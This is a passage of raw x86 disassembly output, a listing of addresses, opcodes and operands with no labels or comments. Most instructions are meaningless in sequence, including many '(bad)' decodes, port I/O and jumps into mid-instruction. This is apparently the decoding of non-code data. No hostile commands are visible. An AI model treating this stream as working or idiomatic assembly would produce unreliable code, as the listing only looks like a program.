  408f6d:	and    BYTE PTR [edi+0x29],al
  408f70:	das    
  408f71:	or     esi,DWORD PTR [edx+edx*2]
  408f74:	mov    al,ds:0xda337e0f
  408f79:	popa   
  408f7a:	add    al,0xb9
  408f7c:	ins    BYTE PTR es:[edi],dx
  408f7d:	jl     0x408f7e
  408f7f:	popa   
  408f80:	enter  0xe05,0x79
  408f84:	cvtpi2ps xmm7,mm0
  408f87:	pop    edi
  408f88:	xchg   esp,eax
  408f89:	jl     0x408f32
  408f8b:	mov    ?,WORD PTR [edx-0x13a12e7d]
  408f91:	cwde   
  408f92:	mov    al,ds:0xdf553b32
  408f97:	ret    
  408f98:	and    al,0xc1
  408f9a:	out    dx,eax
  408f9b:	jp     0x408f30
  408f9d:	mov    esi,0x99277ae0
  408fa2:	add    eax,0xb00fd675
  408fa7:	jns    0x408f30
  408fa9:	pop    esp
  408faa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fab:	push   0xff177d7
  408fb0:	sbb    eax,0x464ed19b
  408fb5:	cmp    ebx,ebx
  408fb7:	ret    0xffc2
  408fba:	jne    0x408f9d
  408fbc:	test   eax,0x4056f19d
  408fc1:	sbb    dh,cl
  408fc3:	adc    esp,DWORD PTR [ecx-0x270f729c]
  408fc9:	iret   
  408fca:	int    0x12
  408fcc:	es pushf 
  408fce:	jl     0x408f66
  408fd0:	icebp  
  408fd1:	in     eax,dx
  408fd2:	mov    eax,0x9d07e613
  408fd7:	jno    0x408fb6
  408fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fda:	mov    DWORD PTR [edx],esp
  408fdc:	(bad)  
  408fde:	nop
  408fdf:	fadd   DWORD PTR [edi+ebp*2-0x39]
  408fe3:	mov    dh,0xa2
  408fe5:	dec    edx
  408fe6:	jp     0x40905a
  408fe8:	jg     0x408f99
  408fea:	sub    BYTE PTR [ebp-0xcfb18a3],ah
  408ff0:	(bad)  
  408ff1:	outs   dx,DWORD PTR ds:[esi]
  408ff2:	ins    DWORD PTR es:[edi],dx
  408ff3:	inc    esp
  408ff4:	lods   eax,DWORD PTR ds:[esi]
  408ff5:	add    al,0x91
  408ff7:	jmp    0xe633:0xe2ee209f
  408ffe:	jmp    0x408fae
  409000:	dec    esp
  409001:	fwait
  409002:	loope  0x408ffb
  409004:	inc    edx
  409005:	in     al,dx
  409006:	loope  0x409082
  409008:	test   al,0x46
  40900a:	push   ebx
  40900b:	sahf   
  40900c:	retf   0x771d
  40900f:	and    eax,0x507b6eaf
  409014:	out    dx,eax
  409015:	out    dx,al
  409016:	imul   edx,DWORD PTR [ecx],0xffffffe8
  409019:	imul   ebp,DWORD PTR [esi-0x73c04205],0x60ad7bb8
  409023:	stos   DWORD PTR es:[edi],eax
  409024:	or     eax,0xd55b96ee
  409029:	gs mov ch,0x60
  40902c:	ror    DWORD PTR gs:[ecx-0x40],1
  409030:	jae    0x409051
  409032:	xchg   esp,eax
  409033:	and    eax,0xb6d8a58b
  409038:	call   0xce76:0xcf46478d
  40903f:	faddp  st(7),st
  409041:	ja     0x409019
  409043:	stc    
  409044:	jecxz  0x40903f
  409046:	fst    DWORD PTR [eax-0x6e]
  409049:	(bad)  
  40904a:	out    0x32,eax
  40904c:	(bad)  
  40904d:	mov    ecx,0xbf225307
  409052:	jp     0x4090d2
  409054:	xlat   BYTE PTR ds:[bx]
  409056:	stos   BYTE PTR es:[edi],al
  409057:	jge    0x40901d
  409059:	adc    eax,0xd3e147c7
  40905e:	clc    
  40905f:	cmp    edx,ecx
  409061:	test   eax,0x966796f9
  409066:	mov    al,ds:0x4a0a4552
  40906b:	xchg   esp,eax
  40906c:	pop    esp
  40906d:	xor    DWORD PTR [esi-0x671bf01c],0xffffffea
  409074:	retf   0x248c
  409077:	ja     0x408ffc
  409079:	sar    BYTE PTR [eax+0x3d],cl
  40907c:	pop    ebp
  40907d:	mov    ebp,0x3bd3dd75
  409082:	ins    BYTE PTR es:[edi],dx
  409083:	hlt    
  409084:	clc    
  409085:	mov    WORD PTR [esi+0x24],gs
  409088:	addr16 (bad) 
  40908a:	fbstp  TBYTE PTR [esi-0x3665729d]
  409090:	gs push edi
  409092:	xchg   edi,eax
  409093:	rcl    DWORD PTR [ebx+0x75],1
  409096:	push   eax
  409097:	jl     0x4090d1
  409099:	or     BYTE PTR [esi+0x7e09d09],bh
  40909f:	call   0x8805a2c8
  4090a4:	scas   al,BYTE PTR es:[edi]
  4090a5:	jnp    0x409064
  4090a7:	test   BYTE PTR [ebp-0x33248c29],cl
  4090ad:	repz aas 
  4090af:	push   0x243b9fc6
  4090b4:	jl     0x409103
  4090b6:	xor    DWORD PTR [eax+0x7488ad],edi
  4090bc:	in     eax,0x5d
  4090be:	cli    
  4090bf:	cmp    ebx,esi
  4090c1:	sbb    BYTE PTR [ebx+eiz*4-0x7e],dl
  4090c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090c6:	aam    0x1a
  4090c8:	sbb    al,0x87
  4090ca:	leave  
  4090cb:	pop    es
  4090cc:	daa    
  4090cd:	stc    
  4090ce:	sbb    BYTE PTR [edx+0x56],al
  4090d1:	bound  ebp,QWORD PTR [ebx+0x601b1956]
  4090d7:	fdiv   QWORD PTR [ebx+0x4d2d0db]
  4090dd:	(bad)  
  4090de:	aas    
  4090df:	jns    0x4090e7
  4090e1:	out    0x5d,eax
  4090e3:	xchg   ecx,eax
  4090e4:	pushf  
  4090e5:	pop    eax
  4090e6:	(bad)  
  4090e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090e8:	lea    ebp,[ecx-0x6]
  4090eb:	into   
  4090ec:	mul    BYTE PTR [ecx]
  4090ee:	adc    esi,DWORD PTR [eax]
  4090f0:	sub    al,0xe
  4090f2:	mov    bh,0x21
  4090f4:	pop    edi
  4090f5:	sahf   
  4090f6:	push   eax
  4090f7:	mov    esp,0x6c5d4d2
  4090fc:	pop    edx
  4090fd:	add    BYTE PTR [ecx],bh
  4090ff:	jns    0x40911f
  409101:	mov    WORD PTR [edi+0x25a6adf9],fs
  409107:	sub    BYTE PTR [ecx-0x6a],ch
  40910a:	inc    edi
  40910b:	add    al,0x12
  40910d:	inc    eax
  40910e:	pop    ecx
  40910f:	push   ecx
  409110:	xor    eax,0x666ad532
  409115:	pop    esi
  409116:	mov    DWORD PTR [edx+esi*8+0x1a],esi
  40911a:	nop
  40911b:	shrd   DWORD PTR [eax-0x65],ecx,cl
  40911f:	pop    ebp
  409120:	outs   dx,DWORD PTR ds:[esi]
  409121:	sbb    edi,edi
  409123:	dec    edx
  409124:	fwait
  409125:	mov    eax,ebx
  409127:	pop    esp
  409128:	dec    esp
  409129:	sub    al,0x65
  40912b:	fisttp QWORD PTR [edx+0x5f]
  40912e:	xchg   ecx,eax
  40912f:	leave  
  409130:	repz ss xchg edi,eax
  409133:	retf   0x5894
  409136:	dec    ecx
  409137:	jns    0x4091af
  409139:	nop
  40913a:	out    dx,eax
  40913b:	arpl   WORD PTR [ebp-0x79],bx
  40913e:	push   ecx
  40913f:	ins    BYTE PTR es:[edi],dx
  409140:	add    ah,cl
  409142:	enter  0x4f19,0x78
  409146:	xor    eax,0xfc4e36e9
  40914b:	pop    ecx
  40914c:	jns    0x4090d3
  40914e:	xchg   BYTE PTR [edi-0x2f],dl
  409151:	xor    al,0x87
  409153:	xchg   ebx,eax
  409154:	and    ecx,DWORD PTR [esi+ebp*4]
  409157:	rcr    BYTE PTR [edi+edx*1+0x23daef0a],1
  40915e:	(bad)  
  40915f:	mov    ch,0x8b
  409161:	mov    ah,0x80
  409163:	or     eax,0x82822fc
  409168:	aaa    
  409169:	sub    DWORD PTR [esi+0x3b],edx
  40916c:	push   edx
  40916d:	cwde   
  40916e:	sbb    al,0x96
  409170:	outs   dx,BYTE PTR ds:[esi]
  409171:	mov    dl,0x4
  409173:	xchg   edi,eax
  409174:	cmp    bl,bh
  409176:	dec    DWORD PTR [eax+esi*8+0x45]
  40917a:	outs   dx,DWORD PTR ds:[esi]
  40917b:	mov    BYTE PTR [eax],0xf
  40917e:	loope  0x4091bb
  409180:	pop    edi
  409181:	das    
  409182:	mov    eax,0x23f892fa
  409187:	mov    edx,edx
  409189:	mov    DWORD PTR ds:0x51c9d7c8,esp
  40918f:	mov    al,0x16
  409191:	pop    esi
  409192:	lods   al,BYTE PTR ds:[esi]
  409193:	hlt    
  409194:	lods   al,BYTE PTR ds:[esi]
  409195:	div    BYTE PTR ds:0x90d534b1
  40919b:	push   ss
  40919c:	sub    BYTE PTR [eax+0x53],bl
  40919f:	fwait
  4091a0:	adc    eax,0x839340d7
  4091a5:	sub    al,0xdf
  4091a7:	inc    edi
  4091a8:	sbb    edx,DWORD PTR [eax]
  4091aa:	cmp    bl,dl
  4091ac:	push   edi
  4091ad:	mov    ebp,0xdb943503
  4091b2:	adc    esp,DWORD PTR [esp+0x4ab6d5b7]
  4091b9:	cmp    BYTE PTR [edx-0x68],bh
  4091bc:	sbb    DWORD PTR [edx-0x2b],esi
  4091bf:	pop    edx
  4091c0:	or     BYTE PTR [ebp+0x5d6e32ad],al
  4091c6:	xor    esp,esp
  4091c8:	pop    eax
  4091c9:	stos   DWORD PTR es:[edi],eax
  4091ca:	js     0x4091fd
  4091cc:	das    
  4091cd:	icebp  
  4091ce:	ja     0x409178
  4091d0:	sub    ch,cl
  4091d2:	mov    bl,0xc2
  4091d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d5:	sub    ebp,edx
  4091d7:	inc    esi
  4091d8:	or     eax,0xc1b48672
  4091dd:	adc    ebp,ebp
  4091df:	jno    0x4091c9
  4091e1:	fldenv [eax+0x2c498baf]
  4091e7:	fwait
  4091e8:	out    dx,al
  4091e9:	fstp   QWORD PTR [esi+ebx*1+0x75ee2e3d]
  4091f0:	loop   0x4091dd
  4091f2:	push   esi
  4091f3:	dec    edi
  4091f4:	jecxz  0x40921f
  4091f6:	cmp    esp,DWORD PTR [edi+eax*2-0x7d]
  4091fa:	mov    al,ds:0xc237113d
  4091ff:	out    dx,al
  409200:	xlat   BYTE PTR ds:[ebx]
  409201:	dec    ecx
  409202:	lods   al,BYTE PTR ds:[esi]
  409203:	test   BYTE PTR [eax-0x2854d3f4],dh
  409209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40920a:	mov    al,0x9c
  40920c:	pop    DWORD PTR ds:0xd87508e5
  409212:	int3   
  409213:	scas   al,BYTE PTR es:[edi]
  409214:	icebp  
  409215:	add    eax,0x6edc3ad9
  40921a:	xor    dl,BYTE PTR [edi-0x77ac1aa9]
  409220:	sub    ch,BYTE PTR [ecx-0x29]
  409223:	int    0x2a
  409225:	mov    ch,0x93
  409227:	xchg   esi,eax
  409228:	xchg   esp,eax
  409229:	push   esi
  40922a:	(bad)  
  40922b:	call   0x1d258e67
  409230:	cwd    
  409232:	loopne 0x4092a2
  409234:	test   BYTE PTR [edi-0x14],dl
  409237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409238:	lods   eax,DWORD PTR ds:[esi]
  409239:	pusha  
  40923a:	repz jae 0x409298
  40923d:	test   al,0x99
  40923f:	imul   BYTE PTR [ebp-0x25]
  409242:	mov    BYTE PTR [edx],0x36
  409245:	pop    ebx
  409246:	xor    eax,0xca7c0ff
  40924b:	sti    
  40924c:	add    dl,BYTE PTR [edx+0x44df02fc]
  409252:	mov    esi,0xd334904e
  409257:	retf   0x474e
  40925a:	mov    al,0x4c
  40925c:	adc    esp,esp
  40925e:	das    
  40925f:	scas   eax,DWORD PTR es:[edi]
  409260:	dec    ebp
  409261:	jnp    0x409205
  409263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409264:	loope  0x4092c7
  409266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409267:	mov    ch,0x71
  409269:	test   DWORD PTR [bp+di],edi
  40926c:	into   
  40926d:	dec    ebp
  40926e:	lahf   
  40926f:	sbb    eax,0xb3fe2d41
  409274:	mov    ch,BYTE PTR [ebp+0x566ffe43]
  40927a:	into   
  40927b:	or     cl,dh
  40927d:	retf   
  40927e:	lds    edi,FWORD PTR [edi]
  409280:	shl    DWORD PTR [eax-0x2bb6aa8e],0x77
  409287:	test   BYTE PTR cs:[edx-0x63386a58],0x4a
  40928f:	dec    edx
  409290:	fimul  WORD PTR [edx-0x2a]
  409293:	add    BYTE PTR ds:0x1845a5c9,bl
  409299:	push   0x5feab92
  40929e:	imul   edx,DWORD PTR [edi+0x4973e564],0x44
  4092a5:	jg     0x40927c
  4092a7:	pop    ss
  4092a8:	in     al,dx
  4092a9:	fisubr DWORD PTR [ecx]
  4092ab:	push   edx
  4092ac:	cli    
  4092ad:	xchg   edx,eax
  4092ae:	rol    DWORD PTR [ecx],1
  4092b0:	out    dx,eax
  4092b1:	cmp    BYTE PTR [ebx-0xd],bl
  4092b4:	mov    bh,0x65
  4092b6:	push   ss
  4092b7:	ss scas eax,DWORD PTR es:[edi]
  4092b9:	cmp    BYTE PTR [esi-0x3beb396],bh
  4092bf:	mov    ecx,0x2e64cabc
  4092c4:	lds    esi,FWORD PTR ds:0x1856e4ee
  4092ca:	jmp    FWORD PTR [edi]
  4092cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092cd:	sbb    dl,BYTE PTR [edx+edx*2]
  4092d0:	call   edx
  4092d2:	aaa    
  4092d3:	sub    esp,ebx
  4092d5:	mov    edx,0xb1c017cd
  4092da:	nop
  4092db:	ins    DWORD PTR es:[edi],dx
  4092dc:	or     al,0x40
  4092de:	es push edx
  4092e0:	sub    DWORD PTR [ebp-0x349dc233],eax
  4092e6:	adc    BYTE PTR cs:[edx],0x9a
  4092ea:	mov    eax,ds:0xe72682a9
  4092ef:	add    eax,0x6c988bc0
  4092f4:	inc    esi
  4092f5:	ins    BYTE PTR es:[edi],dx
  4092f6:	fiadd  WORD PTR [edx+edi*8-0x3af8afe0]
  4092fd:	lods   eax,DWORD PTR ds:[esi]
  4092fe:	fdiv   st,st(0)
  409300:	cmp    eax,0x4d00570b
  409305:	mov    al,0xff
  409307:	enter  0x58c3,0x70
  40930b:	jo     0x40929c
  40930d:	inc    ebp
  40930e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40930f:	mov    eax,0x36aceafa
  409314:	sbb    DWORD PTR [edx+eax*8-0x718ad756],ebx
  40931b:	jno    0x4092c0
  40931d:	xchg   ebx,eax
  40931e:	retf   
  40931f:	fisttp DWORD PTR [esi-0x6f5e401d]
  409325:	(bad)  
  409326:	fadd   QWORD PTR [edi+0x71]
  409329:	cmc    
  40932a:	ds push ds
  40932c:	popa   
  40932d:	sar    BYTE PTR [eax+0x7eba313c],1
  409333:	call   0x81409ec4
  409338:	cs add al,0x46
  40933b:	dec    edi
  40933c:	jmp    0x409389
  40933e:	xchg   edi,eax
  40933f:	push   ebp
  409340:	in     al,dx
  409341:	stc    
  409342:	push   es
  409343:	or     BYTE PTR [ebx-0x78],ah
  409346:	mov    al,0x4c
  409348:	out    0x6,al
  40934a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40934b:	add    DWORD PTR [eax+0x25e5bdbe],esi
  409351:	adc    BYTE PTR [edx],bl
  409353:	and    DWORD PTR gs:[eax+0x8adbc4b],ebp
  40935a:	hlt    
  40935b:	mov    al,ds:0xf603a7e6
  409360:	ja     0x4093df
  409362:	daa    
  409363:	push   0xa5b955b7
  409368:	out    0xd9,al
  40936a:	jbe    0x4092ec
  40936c:	push   esp
  40936d:	and    eax,0xf189ba3c
  409372:	inc    ebx
  409373:	or     eax,0x3d9fe322
  409378:	arpl   WORD PTR [ebp+0x2e],sp
  40937b:	rcl    DWORD PTR [ecx+edi*1-0x65],1
  40937f:	mov    bh,0x26
  409381:	lahf   
  409382:	addr16 aas 
  409384:	cwde   
  409385:	xchg   ebp,eax
  409386:	lahf   
  409387:	mov    eax,ds:0x1c305da7
  40938c:	jg     0x4093dd
  40938e:	mov    ah,dh
  409390:	daa    
  409391:	nop
  409392:	ror    BYTE PTR [ebp+0x6b],0x9d
  409396:	mov    edi,0x70a46f8a
  40939b:	int3   
  40939c:	in     eax,0xea
  40939e:	pop    edx
  40939f:	or     DWORD PTR [edi-0x52fa9c23],0x4
  4093a6:	sbb    BYTE PTR [ebp-0x21],dl
  4093a9:	mov    ds:0x871b48b3,al
  4093ae:	and    dh,dh
  4093b0:	leave  
  4093b1:	jae    0x40941b
  4093b3:	ror    ah,1
  4093b5:	sub    edi,ebx
  4093b7:	outs   dx,BYTE PTR ds:[esi]
  4093b8:	leave  
  4093b9:	dec    ebx
  4093ba:	mov    eax,ds:0x189a7374
  4093bf:	ins    BYTE PTR es:[edi],dx
  4093c0:	jbe    0x409391
  4093c2:	jno    0x4093e0
  4093c4:	cdq    
  4093c5:	pop    ecx
  4093c6:	mov    eax,0x6167b93c
  4093cb:	mov    eax,ds:0x31825548
  4093d0:	sbb    esp,DWORD PTR [edx+0x18]
  4093d3:	mov    ecx,0x7300e7a8
  4093d8:	sahf   
  4093d9:	sbb    DWORD PTR [edi],0x781e309d
  4093df:	cmp    eax,0xa7bff922
  4093e4:	rcr    DWORD PTR [eax],0xf8
  4093e7:	push   edx
  4093e8:	push   0xffffffc2
  4093ea:	(bad)  
  4093eb:	pusha  
  4093ec:	aas    
  4093ed:	add    eax,0x3d150d26
  4093f2:	push   ds
  4093f3:	push   ecx
  4093f4:	sahf   
  4093f5:	jecxz  0x4093e4
  4093f7:	dec    esi
  4093f8:	icebp  
  4093f9:	les    ebx,FWORD PTR [eax-0x6f]
  4093fc:	sbb    esp,esi
  4093fe:	mov    edi,0xcc9a5a1b
  409403:	out    dx,al
  409404:	and    eax,0x89d04d91
  409409:	xchg   DWORD PTR [esi+0x6c],ebp
  40940c:	test   al,0xf9
  40940e:	inc    ecx
  40940f:	pusha  
  409410:	(bad)  
  409412:	scas   eax,DWORD PTR es:[edi]
  409413:	mov    bh,0x5
  409415:	cld    
  409416:	icebp  
  409417:	sub    al,0x58
  409419:	iret   
  40941a:	push   ss
  40941b:	sar    dh,cl
  40941d:	xor    BYTE PTR [ebx],bl
  40941f:	inc    ebx
  409420:	int3   
  409421:	jle    0x4093c4
  409423:	daa    
  409424:	push   0x5c
  409426:	out    0x76,eax
  409428:	das    
  409429:	ins    DWORD PTR es:[edi],dx
  40942a:	mov    bl,0xb2
  40942c:	xlat   BYTE PTR ds:[ebx]
  40942d:	stos   DWORD PTR es:[edi],eax
  40942e:	mov    esp,0xc60b6f8a
  409433:	outs   dx,BYTE PTR ds:[esi]
  409434:	sub    BYTE PTR [esi+0x649cb5a5],dl
  40943a:	cmp    cl,BYTE PTR [edi-0x227f2e52]
  409440:	pop    edi
  409441:	add    ecx,esp
  409443:	dec    esp
  409444:	mov    esi,ebx
  409446:	pop    ebp
  409447:	jl     0x409436
  409449:	jno    0x409497
  40944b:	popa   
  40944c:	mov    eax,ds:0x6741c985
  409451:	scas   eax,DWORD PTR es:[edi]
  409452:	inc    esp
  409453:	dec    edx
  409454:	pop    eax
  409455:	sub    edx,DWORD PTR [ebp-0x74f00c99]
  40945b:	js     0x4093f8
  40945d:	add    al,0x40
  40945f:	test   BYTE PTR [edx-0x1e],0xe3
  409463:	(bad)  
  409465:	dec    esi
  409466:	mov    ds:0x84ae892,al
  40946b:	ins    BYTE PTR es:[edi],dx
  40946c:	in     eax,0xe7
  40946e:	jecxz  0x40947b
  409470:	or     edi,edi
  409472:	jge    0x40945b
  409474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409475:	into   
  409476:	je     0x409402
  409478:	or     ah,dl
  40947a:	pusha  
  40947b:	sbb    dl,BYTE PTR [ebx-0x12]
  40947e:	mov    ebx,0x3d2c2ac3
  409483:	nop
  409484:	cmp    ecx,ecx
  409486:	inc    ebx
  409487:	adc    ch,dh
  409489:	cdq    
  40948a:	xchg   DWORD PTR [ecx+0x70],eax
  40948d:	loope  0x40948c
  40948f:	push   edx
  409490:	adc    esi,DWORD PTR [ecx-0x67]
  409493:	in     eax,dx
  409494:	ins    DWORD PTR es:[edi],dx
  409495:	adc    bl,dh
  409497:	pop    es
  409498:	call   0xf0be:0xe469ac32
  40949f:	sub    ecx,ebp
  4094a1:	inc    esi
  4094a2:	mov    WORD PTR [ebp+0x282c771d],?
  4094a8:	ret    0x5529
  4094ab:	pop    es
  4094ac:	bound  esi,QWORD PTR [ebx]
  4094ae:	jbe    0x4094ad
  4094b0:	rcl    BYTE PTR [edi-0x13d8b7fa],0x45
  4094b7:	nop
  4094b8:	imul   eax,DWORD PTR [ebx+0xb],0x41
  4094bc:	fbld   TBYTE PTR [edx+0x50]
  4094bf:	(bad)
  4094c2:	(bad)  
  4094c3:	mov    ds:0x1d0055c9,eax
  4094c8:	enter  0xa799,0xf6
  4094cc:	mov    esp,0x814d1cd9
  4094d1:	and    bh,BYTE PTR [ebx+0x22]
  4094d4:	sbb    al,bh
  4094d6:	pop    esp
  4094d7:	(bad)  
  4094d8:	in     al,0x1a
  4094da:	sbb    al,0xbf
  4094dd:	pushf  
  4094de:	xchg   DWORD PTR [edi],ecx
  4094e0:	(bad)  
  4094e1:	jae    0x409551
  4094e3:	or     al,0x3a
  4094e5:	ffreep st(4)
  4094e7:	ins    BYTE PTR es:[edi],dx
  4094e8:	(bad)  
  4094e9:	fsub   DWORD PTR [edx-0x449663a7]
  4094ef:	cmp    esi,ebx
  4094f1:	addr16 inc esi
  4094f3:	mov    ss,WORD PTR [esi+0x224a3c6f]
  4094f9:	sar    BYTE PTR [ebp+0x7e],cl
  4094fc:	ins    DWORD PTR es:[edi],dx
  4094fd:	ja     0x409550
  4094ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409500:	in     al,dx
  409501:	cli    
  409502:	xor    ebp,DWORD PTR [edx+0x2e]
  409505:	nop
  409506:	pop    ebp
  409507:	xchg   ebx,eax
  409508:	or     BYTE PTR [esi],0x16
  40950b:	cmp    eax,DWORD PTR [ecx+0x2feaf897]
  409511:	adc    DWORD PTR [edx-0x6c],edx
  409514:	sub    ecx,esp
  409516:	fs push edx
  409518:	inc    edx
  409519:	shl    BYTE PTR [edi],1
  40951b:	ret    
  40951c:	inc    eax
  40951d:	outs   dx,BYTE PTR ds:[esi]
  40951e:	daa    
  40951f:	mov    ebp,0xbd93eb2a
  409524:	mov    eax,ds:0x5232f0cb
  409529:	or     BYTE PTR [edx+ecx*8],al
  40952c:	mov    bl,0x94
  40952e:	dec    ecx
  40952f:	cmp    eax,0x3e675ca3
  409534:	cmp    BYTE PTR [esp+edi*8],al
  409537:	dec    esp
  409538:	xchg   esi,eax
  409539:	fidivr DWORD PTR [esi+0x4cd0a9b3]
  40953f:	mov    cl,0x81
  409541:	inc    edx
  409542:	add    BYTE PTR [esi],dl
  409544:	or     dl,BYTE PTR [edi-0x2f]
  409547:	in     al,dx
  409548:	pop    eax
  409549:	mov    WORD PTR [ecx+0x52],fs
  40954c:	aam    0x6f
  40954e:	popa   
  40954f:	pop    ebx
  409550:	mov    DWORD PTR [ecx-0x9f93e60],ecx
  409556:	das    
  409557:	add    al,BYTE PTR [ecx-0x1e]
  40955a:	ror    DWORD PTR [edx+0x32],cl
  40955d:	in     al,dx
  40955e:	out    dx,eax
  40955f:	int    0x5a
  409561:	shr    ebx,1
  409563:	mov    edx,0xf602a54d
  409568:	dec    ecx
  409569:	ja     0x40953a
  40956b:	and    eax,0x645a504c
  409570:	mov    edi,0x2cd03901
  409575:	in     eax,dx
  409576:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409578:	mov    ebx,0xcbe7e1b5
  40957d:	mov    ds:0x834614eb,eax
  409582:	sbb    ecx,DWORD PTR [esi+0x4d]
  409585:	and    bh,BYTE PTR [ecx-0x67]
  409588:	sub    ah,BYTE PTR [edx]
  40958a:	push   es
  40958b:	mov    esp,0x9657e42b
  409590:	pop    es
  409591:	pop    edx
  409592:	je     0x409550
  409594:	sbb    edx,eax
  409596:	addr16 mov al,ds:0x8a85
  40959a:	mov    ebp,0xe02cdb24
  40959f:	jle    0x4095e8
  4095a1:	push   esi
  4095a2:	jecxz  0x409532
  4095a4:	dec    ebx
  4095a5:	js     0x40960c
  4095a7:	mov    bl,0x91
  4095a9:	adc    ebp,DWORD PTR [ecx]
  4095ab:	into   
  4095ac:	pcmpgtb mm4,QWORD PTR [ecx-0x7e5cd579]
  4095b3:	test   BYTE PTR [ebp+0x5a],dl
  4095b6:	int3   
  4095b7:	push   0x1434f6b2
  4095bc:	pop    edi
  4095bd:	push   ds
  4095be:	ins    BYTE PTR es:[edi],dx
  4095bf:	fild   QWORD PTR [esi-0x25]
  4095c2:	add    eax,DWORD PTR ds:0x6cc6de0f
  4095c8:	jo     0x4095ff
  4095ca:	outs   dx,DWORD PTR ds:[esi]
  4095cb:	mov    cl,dl
  4095cd:	fstp   TBYTE PTR [ebx-0x5]
  4095d0:	(bad)  
  4095d2:	inc    edi
  4095d3:	adc    ebx,ecx
  4095d5:	mov    eax,ds:0xe8ed4f21
  4095da:	jmp    0x4095ed
  4095dc:	cmp    eax,0xb550b42e
  4095e1:	fild   QWORD PTR [ebp-0x5267fca3]
  4095e7:	mov    esi,0x1be7615f
  4095ec:	mov    ds:0x8bd565ea,al
  4095f1:	pushf  
  4095f2:	mov    ah,0x92
  4095f4:	call   DWORD PTR [edi]
  4095f6:	xchg   edi,eax
  4095f7:	bound  edx,QWORD PTR [edx]
  4095f9:	dec    ebx
  4095fa:	inc    ebx
  4095fb:	aad    0xcb
  4095fd:	push   eax
  4095fe:	outs   dx,DWORD PTR es:[esi]
  409600:	cmp    dl,0x45
  409603:	fwait
  409604:	addr16 xchg esi,eax
  409606:	push   esp
  409607:	std    
  409608:	xor    DWORD PTR [edx+0x67edbe07],esp
  40960e:	inc    ecx
  40960f:	and    BYTE PTR ds:0xae4a540a,0xeb
  409616:	outs   dx,DWORD PTR ds:[esi]
  409617:	pop    esi
  409619:	ds fcomp st(4)
  40961c:	or     eax,0xb5ef4d52
  409621:	and    esi,ebx
  409623:	pop    ss
  409624:	sbb    edi,DWORD PTR [ebp+ecx*2+0x6d]
  409628:	add    al,0x23
  40962a:	dec    edx
  40962b:	push   edx
  40962c:	sbb    BYTE PTR [edi],dl
  40962e:	push   ds
  40962f:	retf   
  409630:	mov    ebp,0x75c8e138
  409635:	aad    0x6d
  409637:	sar    bh,1
  409639:	and    eax,0xfcaa1454
  40963e:	ficomp DWORD PTR [eax]
  409640:	les    esp,FWORD PTR [edx-0x351acb15]
  409646:	adc    al,0x29
  409648:	mov    dl,0xd0
  40964a:	mov    eax,0xc4a48d8d
  40964f:	jmp    0x4096a0
  409651:	cdq    
  409652:	int3   
  409653:	std    
  409654:	push   ebx
  409655:	and    DWORD PTR [esi],eax
  409657:	stos   DWORD PTR es:[edi],eax
  409658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409659:	jl     0x4096c3
  40965b:	cmc    
  40965c:	and    ah,bl
  40965e:	mov    cl,0xd8
  409660:	stos   BYTE PTR es:[edi],al
  409661:	int    0x95
  409663:	adc    DWORD PTR [ebp+0x146f9f70],ebx
  409669:	xor    eax,0xcff84a1c
  40966e:	jno    0x4096a3
  409670:	cmp    bl,BYTE PTR [edx-0xa4fb8fb]
  409676:	sub    cl,BYTE PTR [esi-0x468dd41c]
  40967c:	and    DWORD PTR [ebp-0x16144854],eax
  409682:	xor    BYTE PTR [ebp+edx*8-0x77e52d94],dh
  409689:	gs dec ecx
  40968b:	sbb    al,0xc0
  40968d:	jae    0x409665
  40968f:	or     ebp,DWORD PTR [ebx-0x10775434]
  409695:	sbb    BYTE PTR [ecx],bh
  409697:	sbb    ch,BYTE PTR [ecx+0x259de159]
  40969d:	pushf  
  40969e:	nop
  40969f:	lods   al,BYTE PTR ds:[esi]
  4096a0:	mov    eax,0x80e85148
  4096a5:	jp     0x409661
  4096a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a8:	xor    DWORD PTR [eax+ebp*1+0x4e],esp
  4096ac:	dec    ecx
  4096ad:	cmp    edx,edi
  4096af:	add    eax,0xd7f60e9f
  4096b4:	dec    esi
  4096b5:	xlat   BYTE PTR ds:[ebx]
  4096b6:	test   BYTE PTR [edi+ecx*1-0xea90871],dl
  4096bd:	pop    esi
  4096be:	push   ds
  4096bf:	fmul   QWORD PTR [ebx+0x5c2eaf39]
  4096c5:	pop    esi
  4096c6:	xor    al,0x96
  4096c8:	retf   
  4096c9:	push   edi
  4096ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096cc:	or     BYTE PTR [edi-0x5b8a0548],bh
  4096d2:	ja     0x4096cf
  4096d4:	inc    edi
  4096d5:	push   ds
  4096d6:	test   eax,0xe92c4b00
  4096db:	(bad)  
  4096dc:	inc    BYTE PTR [ebp-0x58b38dc4]
  4096e2:	aad    0x88
  4096e4:	push   ecx
  4096e5:	lods   eax,DWORD PTR ds:[esi]
  4096e6:	in     eax,dx
  4096e7:	jo     0x4096fc
  4096e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ea:	lds    ecx,FWORD PTR [ebp-0x49]
  4096ed:	rcr    BYTE PTR [esi],0x6d
  4096f0:	inc    ebx
  4096f1:	in     eax,0x13
  4096f3:	adc    al,0xf9
  4096f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096f6:	jecxz  0x4096bf
  4096f8:	repz jg 0x4096ae
  4096fb:	adc    bl,BYTE PTR [eax-0x19]
  4096fe:	sub    eax,0xc6b696f5
